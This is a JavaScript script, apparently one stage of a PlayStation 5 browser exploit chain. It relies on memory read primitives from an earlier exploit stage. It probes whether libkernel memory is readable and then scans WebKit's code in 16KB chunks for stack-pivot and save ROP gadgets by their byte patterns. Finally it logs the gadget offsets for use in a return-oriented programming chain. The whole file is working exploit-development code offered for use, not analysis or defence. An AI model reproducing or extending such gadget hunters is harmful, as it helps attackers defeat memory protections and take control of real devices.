// hunt_pivot_1340.js v2 — DIRECT-safe, low-memory.
// Phase 0: probe libkernel .text 1 byte (if readable, classic ROP is cheaper).
// Phase 1: slow WebKit pivot/save hunt, 16KB/tick, read32-based, long sleeps.
(async () => {
  const say = async (s) => { try { await log("[hunt] " + s); } catch(e){} };
  await say("begin fw=" + (PS5.fw||"?") + " mode=" + (PS5.mode||"?") + " wk=0x" + Number(PS5.webkitBase||0).toString(16) + " lk=0x" + Number(PS5.libkernelBase||0).toString(16));
  const WK = Number(PS5.webkitBase), LK = Number(PS5.libkernelBase);
  const sleep = (ms)=>new Promise(r=>setTimeout(r,ms));
  // Phase 0: libkernel probe
  try {
    const v = Number(read8(LK)) & 255;
    await say("libkernel probe ok byte=0x"+v.toString(16)+" -> classic ROP viable, no WebKit scan needed");
  } catch(e) { await say("libkernel probe threw (protected) -> need WebKit pivot/save"); }
  await sleep(200);
  // Phase 1: WebKit hunt, read32 dwords, 16KB/tick
  const PIVOT = 0xe78b48; // bytes 48 8b e7 as u24 LE? use byte compare via read32 mask
  // patterns as dwords LE: 48 8b e7 c3 -> 0xc3e78b48 ; 48 89 27 c3 -> 0xc3278948 ; 57 5c c3 -> check via read16+read8
  const LIM = 0x200000; // 2MB first pass
  const CH = 0x4000;    // 16KB per tick
  let pivot=null, save=null;
  outer:
  for(let off=0; off<LIM; off+=CH){
    for(let i=off; i<off+CH; i+=4){
      let d; try{ d = Number(read32(WK+i))>>>0; }catch(e){ await say("fault @+"+i.toString(16)); break outer; }
      if(d===0xc3e78b48 && pivot===null){ pivot=i; await say("FOUND pivot_a rva=0x"+i.toString(16)); }
      if(d===0xc3278948 && save===null){ save=i; await say("FOUND save rva=0x"+i.toString(16)); }
      if(pivot!==null && save!==null) break outer;
      // pivot_b 57 5c c3xxxx: check low 24 bits
      if((d&0xffffff)===0xc35c57 && pivot===null){ pivot=i; await say("FOUND pivot_b rva=0x"+i.toString(16)); }
      if(pivot!==null && save!==null) break outer;
    }
    if((off&0x3ffff)===0) await say("progress off=0x"+off.toString(16));
    await sleep(300);
  }
  await say("DONE pivot="+pivot+" save="+save+" — report RVAs");
  try{ send_notification("hunt done"); }catch(e){}
})();
